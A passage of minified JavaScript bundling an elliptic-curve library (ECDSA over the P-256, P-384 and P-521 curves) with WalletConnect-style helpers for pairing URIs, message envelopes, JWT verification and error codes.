                    u = r.mul(f, h),
                    u = r.add(u, u),
                    u = r.add(u, u),
                    new p(c,l,u)
                }
                add(e) {
                    d(e);
                    const {px: n, py: o, pz: i} = this
                      , {px: s, py: a, pz: c} = e;
                    let l = r.ZERO
                      , u = r.ZERO
                      , h = r.ZERO;
                    const f = t.a
                      , g = r.mul(t.b, Lp);
                    let y = r.mul(n, s)
                      , m = r.mul(o, a)
                      , b = r.mul(i, c)
                      , v = r.add(n, o)
                      , w = r.add(s, a);
                    v = r.mul(v, w),
                    w = r.add(y, m),
                    v = r.sub(v, w),
                    w = r.add(n, i);
                    let T = r.add(s, c);
                    return w = r.mul(w, T),
                    T = r.add(y, b),
                    w = r.sub(w, T),
                    T = r.add(o, i),
                    l = r.add(a, c),
                    T = r.mul(T, l),
                    l = r.add(m, b),
                    T = r.sub(T, l),
                    h = r.mul(f, w),
                    l = r.mul(g, b),
                    h = r.add(l, h),
                    l = r.sub(m, h),
                    h = r.add(m, h),
                    u = r.mul(l, h),
                    m = r.add(y, y),
                    m = r.add(m, y),
                    b = r.mul(f, b),
                    w = r.mul(g, w),
                    m = r.add(m, b),
                    b = r.sub(y, b),
                    b = r.mul(f, b),
                    w = r.add(w, b),
                    y = r.mul(m, w),
                    u = r.add(u, y),
                    y = r.mul(T, w),
                    l = r.mul(v, l),
                    l = r.sub(l, y),
                    y = r.mul(v, m),
                    h = r.mul(T, h),
                    h = r.add(h, y),
                    new p(l,u,h)
                }
                subtract(e) {
                    return this.add(e.negate())
                }
                is0() {
                    return this.equals(p.ZERO)
                }
                wNAF(e) {
                    return m.wNAFCached(this, e, p.normalizeZ)
                }
                multiplyUnsafe(e) {
                    const {endo: n, n: o} = t;
                    jf("scalar", e, Up, o);
                    const i = p.ZERO;
                    if (e === Up)
                        return i;
                    if (this.is0() || e === Dp)
                        return this;
                    if (!n || m.hasPrecomputes(this))
                        return m.wNAFCachedUnsafe(this, e, p.normalizeZ);
                    let {k1neg: s, k1: a, k2neg: c, k2: l} = n.splitScalar(e)
                      , u = i
                      , d = i
                      , h = this;
                    for (; a > Up || l > Up; )
                        a & Dp && (u = u.add(h)),
                        l & Dp && (d = d.add(h)),
                        h = h.double(),
                        a >>= Dp,
                        l >>= Dp;
                    return s && (u = u.negate()),
                    c && (d = d.negate()),
                    d = new p(r.mul(d.px, n.beta),d.py,d.pz),
                    u.add(d)
                }
                multiply(e) {
                    const {endo: n, n: o} = t;
                    let i, s;
                    if (jf("scalar", e, Dp, o),
                    n) {
                        const {k1neg: t, k1: o, k2neg: a, k2: c} = n.splitScalar(e);
                        let {p: l, f: u} = this.wNAF(o)
                          , {p: d, f: h} = this.wNAF(c);
                        l = m.constTimeNegate(t, l),
                        d = m.constTimeNegate(a, d),
                        d = new p(r.mul(d.px, n.beta),d.py,d.pz),
                        i = l.add(d),
                        s = u.add(h)
                    } else {
                        const {p: t, f: r} = this.wNAF(e);
                        i = t,
                        s = r
                    }
                    return p.normalizeZ([i, s])[0]
                }
                multiplyAndAddUnsafe(e, t, r) {
                    const n = p.BASE
                      , o = (e, t) => t !== Up && t !== Dp && e.equals(n) ? e.multiply(t) : e.multiplyUnsafe(t)
                      , i = o(this, t).add(o(e, r));
                    return i.is0() ? void 0 : i
                }
                toAffine(e) {
                    return h(this, e)
                }
                isTorsionFree() {
                    const {h: e, isTorsionFree: r} = t;
                    if (e === Dp)
                        return !0;
                    if (r)
                        return r(p, this);
                    throw new Error("isTorsionFree() has not been declared for the elliptic curve")
                }
                clearCofactor() {
                    const {h: e, clearCofactor: r} = t;
                    return e === Dp ? this : r ? r(p, this) : this.multiplyUnsafe(t.h)
                }
                toRawBytes() {
                    let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                    return vf("isCompressed", e),
                    this.assertValidity(),
                    o(p, this, e)
                }
                toHex() {
                    let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                    return vf("isCompressed", e),
                    Pf(this.toRawBytes(e))
                }
            }
            p.BASE = new p(t.Gx,t.Gy,r.ONE),
            p.ZERO = new p(r.ZERO,r.ONE,r.ZERO);
            const {endo: g, nBitLength: y} = t
              , m = function(e, t) {
                return {
                    constTimeNegate: yp,
                    hasPrecomputes: e => 1 !== Ap(e),
                    unsafeLadder(t, r) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e.ZERO
                          , o = t;
                        for (; r > pp; )
                            r & gp && (n = n.add(o)),
                            o = o.double(),
                            r >>= gp;
                        return n
                    },
                    precomputeWindow(e, r) {
                        const {windows: n, windowSize: o} = bp(r, t)
                          , i = [];
                        let s = e
                          , a = s;
                        for (let t = 0; t < n; t++) {
                            a = s,
                            i.push(a);
                            for (let e = 1; e < o; e++)
                                a = a.add(s),
                                i.push(a);
                            s = a.double()
                        }
                        return i
                    },
                    wNAF(r, n, o) {
                        let i = e.ZERO
                          , s = e.BASE;
                        const a = bp(r, t);
                        for (let e = 0; e < a.windows; e++) {
                            const {nextN: t, offset: r, isZero: c, isNeg: l, isNegF: u, offsetF: d} = vp(o, e, a);
                            o = t,
                            c ? s = s.add(yp(u, n[d])) : i = i.add(yp(l, n[r]))
                        }
                        return {
                            p: i,
                            f: s
                        }
                    },
                    wNAFUnsafe(r, n, o) {
                        let i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : e.ZERO;
                        const s = bp(r, t);
                        for (let e = 0; e < s.windows && o !== pp; e++) {
                            const {nextN: t, offset: r, isZero: a, isNeg: c} = vp(o, e, s);
                            if (o = t,
                            !a) {
                                const e = n[r];
                                i = i.add(c ? e.negate() : e)
                            }
                        }
                        return i
                    },
                    getPrecomputes(e, t, r) {
                        let n = wp.get(t);
                        return n || (n = this.precomputeWindow(t, e),
                        1 !== e && wp.set(t, r(n))),
                        n
                    },
                    wNAFCached(e, t, r) {
                        const n = Ap(e);
                        return this.wNAF(n, this.getPrecomputes(n, e, r), t)
                    },
                    wNAFCachedUnsafe(e, t, r, n) {
                        const o = Ap(e);
                        return 1 === o ? this.unsafeLadder(e, t, n) : this.wNAFUnsafe(o, this.getPrecomputes(o, e, r), t, n)
                    },
                    setWindowSize(e, r) {
                        mp(r, t),
                        Tp.set(e, r),
                        wp.delete(e)
                    }
                }
            }(p, g ? Math.ceil(y / 2) : y);
            return {
                CURVE: t,
                ProjectivePoint: p,
                normPrivateKeyToScalar: u,
                weierstrassEquation: s,
                isWithinCurveOrder: function(e) {
                    return Lf(e, Dp, t.n)
                }
            }
        }
        function Vp(e) {
            const t = function(e) {
                const t = Pp(e);
                return Gf(t, {
                    hash: "hash",
                    hmac: "function",
                    randomBytes: "function"
                }, {
                    bits2int: "function",
                    bits2int_modN: "function",
                    lowS: "boolean"
                }),
                Object.freeze((0,
                k.A)({
                    lowS: !0
                }, t))
            }(e)
              , {Fp: r, n: n, nByteLength: o, nBitLength: i} = t
              , s = r.BYTES + 1
              , a = 2 * r.BYTES + 1;
            function c(e) {
                return tp(e, n)
            }
            function l(e) {
                return np(e, n)
            }
            const {ProjectivePoint: u, normPrivateKeyToScalar: d, weierstrassEquation: h, isWithinCurveOrder: f} = zp((0,
            k.A)((0,
            k.A)({}, t), {}, {
                toBytes(e, t, n) {
                    const o = t.toAffine()
                      , i = r.toBytes(o.x)
                      , s = Uf;
                    return vf("isCompressed", n),
                    n ? s(Uint8Array.from([t.hasEvenY() ? 2 : 3]), i) : s(Uint8Array.from([4]), i, r.toBytes(o.y))
                },
                fromBytes(e) {
                    const t = e.length
                      , n = e[0]
                      , o = e.subarray(1);
                    if (t !== s || 2 !== n && 3 !== n) {
                        if (t === a && 4 === n) {
                            return {
                                x: r.fromBytes(o.subarray(0, r.BYTES)),
                                y: r.fromBytes(o.subarray(r.BYTES, 2 * r.BYTES))
                            }
                        }
                        throw new Error("invalid Point, expected length of " + s + ", or uncompressed " + a + ", got " + t)
                    }
                    {
                        const e = Rf(o);
                        if (!Lf(e, Dp, r.ORDER))
                            throw new Error("Point is not on curve");
                        const t = h(e);
                        let s;
                        try {
                            s = r.sqrt(t)
                        } catch (i) {
                            const e = i instanceof Error ? ": " + i.message : "";
                            throw new Error("Point is not on curve" + e)
                        }
                        return 1 === (1 & n) !== ((s & Dp) === Dp) && (s = r.neg(s)),
                        {
                            x: e,
                            y: s
                        }
                    }
                }
            }));
            function p(e) {
                return e > n >> Dp
            }
            const g = (e, t, r) => Rf(e.slice(t, r));
            class y {
                constructor(e, t, r) {
                    jf("r", e, Dp, n),
                    jf("s", t, Dp, n),
                    this.r = e,
                    this.s = t,
                    null != r && (this.recovery = r),
                    Object.freeze(this)
                }
                static fromCompact(e) {
                    const t = o;
                    return e = Ff("compactSignature", e, 2 * t),
                    new y(g(e, 0, t),g(e, t, 2 * t))
                }
                static fromDER(e) {
                    const {r: t, s: r} = Np.toSig(Ff("DER", e));
                    return new y(t,r)
                }
                assertValidity() {}
                addRecoveryBit(e) {
                    return new y(this.r,this.s,e)
                }
                recoverPublicKey(e) {
                    const {r: n, s: o, recovery: i} = this
                      , s = w(Ff("msgHash", e));
                    if (null == i || ![0, 1, 2, 3].includes(i))
                        throw new Error("recovery id invalid");
                    const a = 2 === i || 3 === i ? n + t.n : n;
                    if (a >= r.ORDER)
                        throw new Error("recovery id 2 or 3 invalid");
                    const d = 0 === (1 & i) ? "02" : "03"
                      , h = u.fromHex(d + Fp(a, r.BYTES))
                      , f = l(a)
                      , p = c(-s * f)
                      , g = c(o * f)
                      , y = u.BASE.multiplyAndAddUnsafe(h, p, g);
                    if (!y)
                        throw new Error("point at infinify");
                    return y.assertValidity(),
                    y
                }
                hasHighS() {
                    return p(this.s)
                }
                normalizeS() {
                    return this.hasHighS() ? new y(this.r,c(-this.s),this.recovery) : this
                }
                toDERRawBytes() {
                    return Wf(this.toDERHex())
                }
                toDERHex() {
                    return Np.hexFromSig(this)
                }
                toCompactRawBytes() {
                    return Wf(this.toCompactHex())
                }
                toCompactHex() {
                    const e = o;
                    return Fp(this.r, e) + Fp(this.s, e)
                }
            }
            const m = {
                isValidPrivateKey(e) {
                    try {
                        return d(e),
                        !0
                    } catch (t) {
                        return !1
                    }
                },
                normPrivateKeyToScalar: d,
                randomPrivateKey: () => {
                    const e = fp(t.n);
                    return function(e, t) {
                        let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                        const n = e.length
                          , o = hp(t)
                          , i = fp(t);
                        if (n < 16 || n < i || n > 1024)
                            throw new Error("expected " + i + "-1024 bytes of input, got " + n);
                        const s = tp(r ? kf(e) : Rf(e), t - Zf) + Zf;
                        return r ? Nf(s, o) : Mf(s, o)
                    }(t.randomBytes(e), t.n)
                }
                ,
                precompute() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 8
                      , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : u.BASE;
                    return t._setWindowSize(e),
                    t.multiply(BigInt(3)),
                    t
                }
            };
            function b(e) {
                if ("bigint" == typeof e)
                    return !1;
                if (e instanceof u)
                    return !0;
                const n = Ff("key", e).length
                  , i = r.BYTES
                  , s = i + 1
                  , a = 2 * i + 1;
                return t.allowedPrivateKeyLengths || o === s ? void 0 : n === s || n === a
            }
            const v = t.bits2int || function(e) {
                if (e.length > 8192)
                    throw new Error("input is too large");
                const t = Rf(e)
                  , r = 8 * e.length - i;
                return r > 0 ? t >> BigInt(r) : t
            }
              , w = t.bits2int_modN || function(e) {
                return c(v(e))
            }
              , T = zf(i);
            function A(e) {
                return jf("num < 2^" + i, e, Up, T),
                Mf(e, o)
            }
            function E(e, n) {
                let o = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : P;
                if (["recovered", "canonical"].some((e => e in o)))
                    throw new Error("sign() legacy options not supported");
                const {hash: i, randomBytes: s} = t;
                let {lowS: a, prehash: h, extraEntropy: g} = o;
                null == a && (a = !0),
                e = Ff("msgHash", e),
                kp(o),
                h && (e = Ff("prehashed msgHash", i(e)));
                const m = w(e)
                  , b = d(n)
                  , T = [A(b), A(m)];
                if (null != g && !1 !== g) {
                    const e = !0 === g ? s(r.BYTES) : g;
                    T.push(Ff("extraEntropy", e))
                }
                const E = Uf(...T)
                  , C = m;
                return {
                    seed: E,
                    k2sig: function(e) {
                        const t = v(e);
                        if (!f(t))
                            return;
                        const r = l(t)
                          , n = u.BASE.multiply(t).toAffine()
                          , o = c(n.x);
                        if (o === Up)
                            return;
                        const i = c(r * c(C + o * b));
                        if (i === Up)
                            return;
                        let s = (n.x === o ? 0 : 2) | Number(n.y & Dp)
                          , d = i;
                        return a && p(i) && (d = function(e) {
                            return p(e) ? c(-e) : e
                        }(i),
                        s ^= 1),
                        new y(o,d,s)
                    }
                }
            }
            const P = {
                lowS: t.lowS,
                prehash: !1
            }
              , C = {
                lowS: t.lowS,
                prehash: !1
            };
            return u.BASE._setWindowSize(8),
            {
                CURVE: t,
                getPublicKey: function(e) {
                    let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                    return u.fromPrivateKey(e).toRawBytes(t)
                },
                getSharedSecret: function(e, t) {
                    let r = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                    if (!0 === b(e))
                        throw new Error("first arg must be private key");
                    if (!1 === b(t))
                        throw new Error("second arg must be public key");
                    return u.fromHex(t).multiply(d(e)).toRawBytes(r)
                },
                sign: function(e, r) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : P;
                    const {seed: o, k2sig: i} = E(e, r, n)
                      , s = t;
                    return function(e, t, r) {
                        if ("number" != typeof e || e < 2)
                            throw new Error("hashLen must be a number");
                        if ("number" != typeof t || t < 2)
                            throw new Error("qByteLen must be a number");
                        if ("function" != typeof r)
                            throw new Error("hmacFn must be a function");
                        let n = Vf(e)
                          , o = Vf(e)
                          , i = 0;
                        const s = () => {
                            n.fill(1),
                            o.fill(0),
                            i = 0
                        }
                          , a = function() {
                            for (var e = arguments.length, t = new Array(e), i = 0; i < e; i++)
                                t[i] = arguments[i];
                            return r(o, n, ...t)
                        }
                          , c = function() {
                            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : Vf(0);
                            o = a(Hf([0]), e),
                            n = a(),
                            0 !== e.length && (o = a(Hf([1]), e),
                            n = a())
                        }
                          , l = () => {
                            if (i++ >= 1e3)
                                throw new Error("drbg: tried 1000 values");
                            let e = 0;
                            const r = [];
                            for (; e < t; ) {
                                n = a();
                                const t = n.slice();
                                r.push(t),
                                e += n.length
                            }
                            return Uf(...r)
                        }
                        ;
                        return (e, t) => {
                            let r;
                            for (s(),
                            c(e); !(r = t(l())); )
                                c();
                            return s(),
                            r
                        }
                    }(s.hash.outputLen, s.nByteLength, s.hmac)(o, i)
                },
                verify: function(e, r, n) {
                    var o;
                    let i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : C;
                    const s = e;
                    r = Ff("msgHash", r),
                    n = Ff("publicKey", n);
                    const {lowS: a, prehash: d, format: h} = i;
                    if (kp(i),
                    "strict"in i)
                        throw new Error("options.strict was renamed to lowS");
                    if (void 0 !== h && "compact" !== h && "der" !== h)
                        throw new Error("format must be compact or der");
                    const f = "string" == typeof s || mf(s)
                      , p = !f && !h && "object" == typeof s && null !== s && "bigint" == typeof s.r && "bigint" == typeof s.s;
                    if (!f && !p)
                        throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");
                    let g, m;
                    try {
                        if (p && (g = new y(s.r,s.s)),
                        f) {
                            try {
                                "compact" !== h && (g = y.fromDER(s))
                            } catch (I) {
                                if (!(I instanceof Np.Err))
                                    throw I
                            }
                            !g && "der" !== h && (g = y.fromCompact(s))
                        }
                        m = u.fromHex(n)
                    } catch (B) {
                        return !1
                    }
                    if (!g || a && g.hasHighS())
                        return !1;
                    d && (r = t.hash(r));
                    const {r: b, s: v} = g
                      , T = w(r)
                      , A = l(v)
                      , E = c(T * A)
                      , P = c(b * A)
                      , S = null === (o = u.BASE.multiplyAndAddUnsafe(m, E, P)) || void 0 === o ? void 0 : o.toAffine();
                    return !!S && c(S.x) === b
                },
                ProjectivePoint: u,
                Signature: y,
                utils: m
            }
        }
        function Hp(e) {
            return {
                hash: e,
                hmac: function(t) {
                    for (var r = arguments.length, n = new Array(r > 1 ? r - 1 : 0), o = 1; o < r; o++)
                        n[o - 1] = arguments[o];
                    return uf(e, t, function() {
                        let e = 0;
                        for (let r = 0; r < arguments.length; r++) {
                            const t = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                            zu(t),
                            e += t.length
                        }
                        const t = new Uint8Array(e);
                        for (let r = 0, n = 0; r < arguments.length; r++) {
                            const e = r < 0 || arguments.length <= r ? void 0 : arguments[r];
                            t.set(e, n),
                            n += e.length
                        }
                        return t
                    }(...n))
                },
                randomBytes: nd
            }
        }
        function qp(e, t) {
            const r = t => Vp((0,
            k.A)((0,
            k.A)({}, e), Hp(t)));
            return (0,
            k.A)((0,
            k.A)({}, r(t)), {}, {
                create: r
            })
        }
        const Gp = dp(BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff"))
          , $p = qp({
            a: Gp.create(BigInt("-3")),
            b: BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b"),
            Fp: Gp,
            n: BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),
            Gx: BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),
            Gy: BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"),
            h: BigInt(1),
            lowS: !1
        }, Ud)
          , Kp = dp(BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000ffffffff"));
        qp({
            a: Kp.create(BigInt("-3")),
            b: BigInt("0xb3312fa7e23ee7e4988e056be3f82d19181d9c6efe8141120314088f5013875ac656398d8a2ed19d2a85c8edd3ec2aef"),
            Fp: Kp,
            n: BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffc7634d81f4372ddf581a0db248b0a77aecec196accc52973"),
            Gx: BigInt("0xaa87ca22be8b05378eb1c71ef320ad746e1d3b628ba79b9859f741e082542a385502f25dbf55296c3a545e3872760ab7"),
            Gy: BigInt("0x3617de4a96262c6f5d9e98bf9292dc29f8f41dbd289a147ce9da3113b5f0b8c00a60b1ce1d7e819d7a431d7c90ea0e5f"),
            h: BigInt(1),
            lowS: !1
        }, Ld);
        const Zp = dp(BigInt("0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"));
        qp({
            a: Zp.create(BigInt("-3")),
            b: BigInt("0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00"),
            Fp: Zp,
            n: BigInt("0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409"),
            Gx: BigInt("0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66"),
            Gy: BigInt("0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650"),
            h: BigInt(1),
            lowS: !1,
            allowedPrivateKeyLengths: [130, 131, 132]
        }, Dd);
        const Yp = $p
          , Jp = "base10"
          , Xp = "base16"
          , Qp = "base64pad"
          , eg = "base64url"
          , tg = "utf8";
        function rg() {
            return Ol(nd(32), Xp)
        }
        function ng(e) {
            return Ol(pf(xl(e, Xp)), Xp)
        }
        function og(e) {
            return Ol(pf(xl(e, tg)), Xp)
        }
        function ig(e) {
            return xl("".concat(e), Jp)
        }
        function sg(e) {
            return Number(Ol(e, Jp))
        }
        function ag(e) {
            return e.replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "")
        }
        function cg(e) {
            const t = e.replace(/-/g, "+").replace(/_/g, "/")
              , r = (4 - t.length % 4) % 4;
            return t + "=".repeat(r)
        }
        function lg(e) {
            if (2 === sg(e.type))
                return Ol(tc([e.type, e.sealed]), Qp);
            if (1 === sg(e.type)) {
                if (typeof e.senderPublicKey > "u")
                    throw new Error("Missing sender public key for type 1 envelope");
                return Ol(tc([e.type, e.senderPublicKey, e.iv, e.sealed]), Qp)
            }
            return Ol(tc([e.type, e.iv, e.sealed]), Qp)
        }
        function ug(e) {
            const t = xl((e.encoding || Qp) === eg ? cg(e.encoded) : e.encoded, Qp)
              , r = t.slice(0, 1);
            if (1 === sg(r)) {
                const e = 33
                  , n = e + 12
                  , o = t.slice(1, e)
                  , i = t.slice(e, n);
                return {
                    type: r,
                    sealed: t.slice(n),
                    iv: i,
                    senderPublicKey: o
                }
            }
            if (2 === sg(r)) {
                return {
                    type: r,
                    sealed: t.slice(1),
                    iv: nd(12)
                }
            }
            const n = t.slice(1, 13);
            return {
                type: r,
                sealed: t.slice(13),
                iv: n
            }
        }
        function dg(e) {
            const t = (null === e || void 0 === e ? void 0 : e.type) || 0;
            if (1 === t) {
                if (typeof (null === e || void 0 === e ? void 0 : e.senderPublicKey) > "u")
                    throw new Error("missing sender public key");
                if (typeof (null === e || void 0 === e ? void 0 : e.receiverPublicKey) > "u")
                    throw new Error("missing receiver public key")
            }
            return {
                type: t,
                senderPublicKey: null === e || void 0 === e ? void 0 : e.senderPublicKey,
                receiverPublicKey: null === e || void 0 === e ? void 0 : e.receiverPublicKey
            }
        }
        function hg(e) {
            return 1 === e.type && "string" == typeof e.senderPublicKey && "string" == typeof e.receiverPublicKey
        }
        function fg(e) {
            return 2 === e.type
        }
        function pg(e, t) {
            const [r,n,o] = e.split(".")
              , i = Buffer.from(cg(o), "base64");
            if (64 !== i.length)
                throw new Error("Invalid signature length");
            const s = i.slice(0, 32)
              , a = i.slice(32, 64)
              , c = "".concat(r, ".").concat(n)
              , l = pf(c)
              , u = function(e) {
                const t = Buffer.from(e.x, "base64")
                  , r = Buffer.from(e.y, "base64");
                return tc([new Uint8Array([4]), t, r])
            }(t);
            if (!Yp.verify(tc([s, a]), l, u))
                throw new Error("Invalid signature");
            return xi(e).payload
        }
        function gg(e) {
            return (null === e || void 0 === e ? void 0 : e.relay) || {
                protocol: "irn"
            }
        }
        function yg(e) {
            const t = Wl[e];
            if (typeof t > "u")
                throw new Error("Relay Protocol not supported: ".concat(e));
            return t
        }
        function mg(e) {
            const t = {}
              , r = "relay" + (arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "-");
            return Object.keys(e).forEach((n => {
                if (n.startsWith(r)) {
                    const o = n.replace(r, "")
                      , i = e[n];
                    t[o] = i
                }
            }
            )),
            t
        }
        function bg(e) {
            if (!e.includes("wc:")) {
                const t = wu(e);
                null != t && t.includes("wc:") && (e = t)
            }
            const t = (e = (e = e.includes("wc://") ? e.replace("wc://", "") : e).includes("wc:") ? e.replace("wc:", "") : e).indexOf(":")
              , r = -1 !== e.indexOf("?") ? e.indexOf("?") : void 0
              , n = e.substring(0, t)
              , o = e.substring(t + 1, r).split("@")
              , i = typeof r < "u" ? e.substring(r) : ""
              , s = new URLSearchParams(i)
              , a = {};
            s.forEach(( (e, t) => {
                a[t] = e
            }
            ));
            const c = "string" == typeof a.methods ? a.methods.split(",") : void 0;
            return {
                protocol: n,
                topic: vg(o[0]),
                version: parseInt(o[1], 10),
                symKey: a.symKey,
                relay: mg(a),
                methods: c,
                expiryTimestamp: a.expiryTimestamp ? parseInt(a.expiryTimestamp, 10) : void 0
            }
        }
        function vg(e) {
            return e.startsWith("//") ? e.substring(2) : e
        }
        function wg(e) {
            const t = new URLSearchParams
              , r = function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "-";
                const r = {};
                return Object.keys(e).forEach((n => {
                    const o = n
                      , i = "relay" + t + o;
                    e[o] && (r[i] = e[o])
                }
                )),
                r
            }(e.relay);
            Object.keys(r).sort().forEach((e => {
                t.set(e, r[e])
            }
            )),
            t.set("symKey", e.symKey),
            e.expiryTimestamp && t.set("expiryTimestamp", e.expiryTimestamp.toString()),
            e.methods && t.set("methods", e.methods.join(","));
            const n = t.toString();
            return "".concat(e.protocol, ":").concat(e.topic, "@").concat(e.version, "?").concat(n)
        }
        function Tg(e, t, r) {
            return "".concat(e, "?wc_ev=").concat(r, "&topic=").concat(t)
        }
        var Ag = Object.defineProperty
          , Eg = Object.defineProperties
          , Pg = Object.getOwnPropertyDescriptors
          , Cg = Object.getOwnPropertySymbols
          , Sg = Object.prototype.hasOwnProperty
          , Ig = Object.prototype.propertyIsEnumerable
          , Bg = (e, t, r) => t in e ? Ag(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , xg = (e, t) => {
            for (var r in t || (t = {}))
                Sg.call(t, r) && Bg(e, r, t[r]);
            if (Cg)
                for (var r of Cg(t))
                    Ig.call(t, r) && Bg(e, r, t[r]);
            return e
        }
          , Og = (e, t) => Eg(e, Pg(t));
        function _g(e) {
            const t = [];
            return e.forEach((e => {
                const [r,n] = e.split(":");
                t.push("".concat(r, ":").concat(n))
            }
            )),
            t
        }
        function Wg(e) {
            return e.includes(":")
        }
        function Rg(e) {
            return Wg(e) ? e.split(":")[0] : e
        }
        function kg(e) {
            var t, r, n;
            const o = {};
            if (!jg(e))
                return o;
            for (const [i,s] of Object.entries(e)) {
                const e = Wg(i) ? [i] : s.chains
                  , a = s.methods || []
                  , c = s.events || []
                  , l = Rg(i);
                o[l] = Og(xg({}, o[l]), {
                    chains: gu(e, null == (t = o[l]) ? void 0 : t.chains),
                    methods: gu(a, null == (r = o[l]) ? void 0 : r.methods),
                    events: gu(c, null == (n = o[l]) ? void 0 : n.events)
                })
            }
            return o
        }
        function Mg(e, t) {
            t = t.map((e => e.replace("did:pkh:", "")));
            const r = function(e) {
                const t = {};
                return null !== e && void 0 !== e && e.forEach((e => {
                    var r;
                    const [n,o] = e.split(":");
                    t[n] || (t[n] = {
                        accounts: [],
                        chains: [],
                        events: [],
                        methods: []
                    }),
                    t[n].accounts.push(e),
                    null == (r = t[n].chains) || r.push("".concat(n, ":").concat(o))
                }
                )),
                t
            }(t);
            for (const [n,o] of Object.entries(r))
                o.methods ? o.methods = gu(o.methods, e) : o.methods = e,
                o.events = ["chainChanged", "accountsChanged"];
            return r
        }
        const Ng = {
            INVALID_METHOD: {
                message: "Invalid method.",
                code: 1001
            },
            INVALID_EVENT: {
                message: "Invalid event.",
                code: 1002
            },
            INVALID_UPDATE_REQUEST: {
                message: "Invalid update request.",
                code: 1003
            },
            INVALID_EXTEND_REQUEST: {
                message: "Invalid extend request.",
                code: 1004
            },
            INVALID_SESSION_SETTLE_REQUEST: {
                message: "Invalid session settle request.",
                code: 1005
            },
            UNAUTHORIZED_METHOD: {
                message: "Unauthorized method.",
                code: 3001
            },
            UNAUTHORIZED_EVENT: {
                message: "Unauthorized event.",
                code: 3002
            },
            UNAUTHORIZED_UPDATE_REQUEST: {
                message: "Unauthorized update request.",
                code: 3003
            },
            UNAUTHORIZED_EXTEND_REQUEST: {
                message: "Unauthorized extend request.",
                code: 3004
            },
            USER_REJECTED: {
                message: "User rejected.",
                code: 5e3
            },
            USER_REJECTED_CHAINS: {
                message: "User rejected chains.",
                code: 5001
            },
            USER_REJECTED_METHODS: {
                message: "User rejected methods.",
                code: 5002
            },
            USER_REJECTED_EVENTS: {
                message: "User rejected events.",
                code: 5003
            },
            UNSUPPORTED_CHAINS: {
                message: "Unsupported chains.",
                code: 5100
            },
            UNSUPPORTED_METHODS: {
                message: "Unsupported methods.",
                code: 5101
            },
            UNSUPPORTED_EVENTS: {
                message: "Unsupported events.",
                code: 5102
            },
            UNSUPPORTED_ACCOUNTS: {
                message: "Unsupported accounts.",
                code: 5103
            },
            UNSUPPORTED_NAMESPACE_KEY: {
                message: "Unsupported namespace key.",
                code: 5104
            },
            USER_DISCONNECTED: {
                message: "User disconnected.",
                code: 6e3
            },
            SESSION_SETTLEMENT_FAILED: {
                message: "Session settlement failed.",
                code: 7e3
            },
            WC_METHOD_UNSUPPORTED: {
                message: "Unsupported wc_ method.",
                code: 10001
            }
        }
          , Fg = {
            NOT_INITIALIZED: {
                message: "Not initialized.",
                code: 1
            },
            NO_MATCHING_KEY: {
                message: "No matching key.",
                code: 2
            },
            RESTORE_WILL_OVERRIDE: {
                message: "Restore will override.",
                code: 3
            },
            RESUBSCRIBED: {
                message: "Resubscribed.",
                code: 4
            },
            MISSING_OR_INVALID: {
                message: "Missing or invalid.",
                code: 5
            },
            EXPIRED: {
                message: "Expired.",
                code: 6
            },
            UNKNOWN_TYPE: {
                message: "Unknown type.",
                code: 7
            },
            MISMATCHED_TOPIC: {
                message: "Mismatched topic.",
                code: 8
            },
            NON_CONFORMING_NAMESPACES: {
                message: "Non conforming namespaces.",
                code: 9
            }
        };
        function Ug(e, t) {
            const {message: r, code: n} = Fg[e];
            return {
                message: t ? "".concat(r, " ").concat(t) : r,
                code: n
            }
        }
        function Dg(e, t) {
            const {message: r, code: n} = Ng[e];
            return {
                message: t ? "".concat(r, " ").concat(t) : r,
                code: n
            }
        }
        function Lg(e, t) {
            return !!Array.isArray(e) && (!(typeof t < "u" && e.length) || e.every(t))
        }
        function jg(e) {
            return Object.getPrototypeOf(e) === Object.prototype && Object.keys(e).length
        }
        function zg(e) {
            return typeof e > "u"
        }
        function Vg(e, t) {
            return !(!t || !zg(e)) || "string" == typeof e && !!e.trim().length
        }
        function Hg(e, t) {
